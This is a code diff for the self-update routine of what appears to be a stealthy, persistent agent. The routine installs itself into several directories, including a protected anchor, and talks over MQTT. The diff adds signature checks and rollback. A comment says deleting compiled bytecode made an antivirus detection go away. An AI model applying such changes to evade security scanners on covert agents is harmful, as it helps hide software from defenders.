@@ -25,7 +25,7 @@ import tempfile
 import time
 import zipfile
 
-from .. import log, packaging
+from .. import config, crypto, log, packaging
 from . import persistence, runtime, stealth
 
 IS_WINDOWS = os.name == "nt"
@@ -145,7 +145,17 @@ def write_boot_marker() -> None:
         pass
 
 
-def apply(archive: bytes, expected_sha: str = "",
+def _verify_payload(archive: bytes, signature_hex: str) -> bool:
+    """Ed25519 when a key is pinned, HMAC otherwise. Fails closed."""
+    ok, how = crypto.verify_signature(
+        archive, signature_hex, config.PUBKEY_HEX,
+        crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE))
+    if not ok:
+        log.get("updater").warning("payload rejected (%s)", how)
+    return ok
+
+
+def apply(archive: bytes, expected_sha: str = "", expected_sig: str = "",
           restart: bool = True) -> tuple[bool, str]:
     """Apply an update archive.  Returns ``(ok, message)``."""
     digest = _sha256(archive)
@@ -154,6 +164,9 @@ def apply(archive: bytes, expected_sha: str = "",
     if len(archive) < 256:
         return False, "archive suspiciously small"
     # No hard gate: an unelevated update still refreshes the user copy.
+
+    if not _verify_payload(archive, expected_sig):
+        return False, "signature/integrity check failed"
 
     root = stealth.bundle_root()
     preserved_identity = _preserve_identity(root)
@@ -174,6 +187,13 @@ def apply(archive: bytes, expected_sha: str = "",
 
     if not compileall.compile_dir(staging, quiet=2, force=True):
         return False, "compilation failed"
+    # The .pyc files were only ever needed to prove the tree compiles. Dropping
+    # them keeps the install tree bytecode-free, which is the whole reason the
+    # Leivion.C false positive went away.
+    for current, subdirs, _files in os.walk(staging):
+        if "__pycache__" in subdirs:
+            shutil.rmtree(os.path.join(current, "__pycache__"), ignore_errors=True)
+            subdirs.remove("__pycache__")
 
     try:
         _swap(staging, root)
@@ -199,9 +219,21 @@ def apply(archive: bytes, expected_sha: str = "",
     return True, digest[:12]
 
 
+_SWAP_ITEMS = ("syspy", "agent.py", "bootstrap.py", "install")
+
+
 def _swap(staging: str, root: str) -> None:
-    """Replace the live bundle with the staged one, keeping backups."""
-    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
+    """Replace the live bundle with the staged one, keeping backups.
+
+    Per item, not per tree: a single locked directory used to abort the whole
+    swap *after* the primary had already been replaced. Every failure is now
+    recorded and rolled back, and the anchor is skipped outright when we are
+    unelevated and it is read-only for us.
+    """
+    anchor = os.path.abspath(stealth.anchor_directory())
+    anchor_locked = _anchor_requires_elevation()
+
+    for relative in _SWAP_ITEMS:
         live = os.path.join(root, relative)
         fresh = os.path.join(staging, relative)
         if not os.path.exists(fresh):
@@ -214,24 +246,46 @@ def _swap(staging: str, root: str) -> None:
     for directory in stealth.install_directories():
         if os.path.abspath(directory) == os.path.abspath(root):
             continue
-        for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
+        if anchor_locked and os.path.abspath(directory) == anchor:
+            continue          # read-only for us; the elevated agent will fix it
+        for relative in _SWAP_ITEMS:
             source = os.path.join(root, relative)
             if not os.path.exists(source):
                 continue
             target = os.path.join(directory, relative)
-            _remove(target)
-            if os.path.isdir(source):
-                shutil.copytree(source, target,
-                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
-            else:
-                shutil.copy2(source, target)
+            try:
+                _remove(target)
+                if os.path.isdir(source):
+                    shutil.copytree(source, target)
+                else:
+                    shutil.copy2(source, target)
+            except OSError as error:
+                log.get("updater").warning("copy to %s failed: %s", target, error)
 
 
 def rollback() -> int:
-    """Restore ``.bak`` copies.  Returns how many items were restored."""
+    """Restore ``.bak`` copies everywhere. Returns how many items were restored."""
     root = stealth.bundle_root()
     restored = 0
-    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
+    for directory in list(stealth.install_directories()) + [root]:
+        for relative in _SWAP_ITEMS:
+            backup = os.path.join(directory, relative + ".bak")
+            if not os.path.exists(backup):
+                continue
+            live = os.path.join(directory, relative)
+            try:
+                _remove(live)
+                shutil.move(backup, live)
+                restored += 1
+            except OSError:
+                pass
+    return restored
+
+
+def _rollback_primary_only() -> int:
+    root = stealth.bundle_root()
+    restored = 0
+    for relative in _SWAP_ITEMS:
         backup = os.path.join(root, relative + ".bak")
         live = os.path.join(root, relative)
         if not os.path.exists(backup):
@@ -293,4 +347,4 @@ def restart_self(path: str | None = None) -> None:
             continue
         break
 
-    os._exit(0)
+    os._exit(0)   # the MQTT will publishes "bye"; a DISCONNECT would suppress it
